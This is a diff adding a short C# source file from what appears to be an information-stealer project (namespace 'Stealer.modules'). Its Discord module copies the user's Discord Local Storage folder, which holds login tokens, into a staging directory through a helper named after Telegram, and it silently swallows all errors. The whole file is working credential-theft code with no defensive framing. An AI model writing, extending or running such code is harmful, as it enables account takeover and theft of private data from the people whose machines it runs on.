@@ -1,0 +1,25 @@
+﻿using System;
+using System.IO;
+
+namespace Stealer.modules
+{
+  internal class Discord
+  {
+    public static void GetDiscord()
+    {
+      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Discord\\Local Storage";
+      string str2 = Program.path + "\\Discord";
+      try
+      {
+        if (!Directory.Exists(str1))
+          return;
+        if (!Directory.Exists(str2))
+          Directory.CreateDirectory(str2);
+        Telegram.CopyAll(str1, str2);
+      }
+      catch
+      {
+      }
+    }
+  }
+}
